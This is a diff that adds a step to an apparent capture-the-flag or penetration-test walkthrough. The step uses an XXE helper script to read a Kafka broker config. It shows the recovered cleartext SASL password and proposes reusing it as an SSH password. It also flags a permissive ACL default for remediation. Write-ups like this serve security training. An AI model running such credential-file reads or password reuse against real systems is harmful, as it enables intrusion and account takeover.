@@ -1005,6 +1005,43 @@ WantedBy=multi-user.target
 ```
 
 Key finding: the broker runs as `svc-infra` and reads `/opt/kafka_2.13-4.3.1/config/server.properties`. Kafka stores its SASL account passwords in that file, so reading it next should yield a secret for the `svc-infra` account.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+#### 3.1.4 Recover the svc-infra credential from the broker config
+
+Read the Kafka properties file the unit pointed to. Its SASL section defines the PLAIN login module, which embeds each principal's password in cleartext.
+
+**Command:** `python3 aidx-read.py /opt/kafka_2.13-4.3.1/config/server.properties`
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `python3 aidx-read.py` | Run the helper | Submits the XXE and reads the result back. |
+| `/opt/kafka_2.13-4.3.1/config/server.properties` | Target file | The broker config located from the systemd unit's `ExecStart`. |
+
+**Result:** (trimmed to the significant lines; the rest is Apache boilerplate and defaults)
+
+```shell
+listeners=PLAINTEXT://127.0.0.1:9092,SASL_PLAINTEXT://127.0.0.1:9094,CONTROLLER://127.0.0.1:9093
+log.dirs=/var/lib/kafka/data
+
+############################# Security #############################
+sasl.enabled.mechanisms=PLAIN
+listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
+  user_svc_infra="Ny2hdpme$bwT3";
+
+authorizer.class.name=org.apache.kafka.metadata.authorizer.StandardAuthorizer
+allow.everyone.if.no.acl.found=true
+```
+
+Key finding: the SASL PLAIN module stores `user_svc_infra="Ny2hdpme$bwT3"` in cleartext. The broker runs as the Linux user `svc-infra`, so this is a candidate SSH password for that account. Also note `allow.everyone.if.no.acl.found=true`, a permissive Kafka authorization default worth flagging for remediation. The password contains a `$`, so it must be single-quoted in a shell.
+
 
 
 <div align="center">
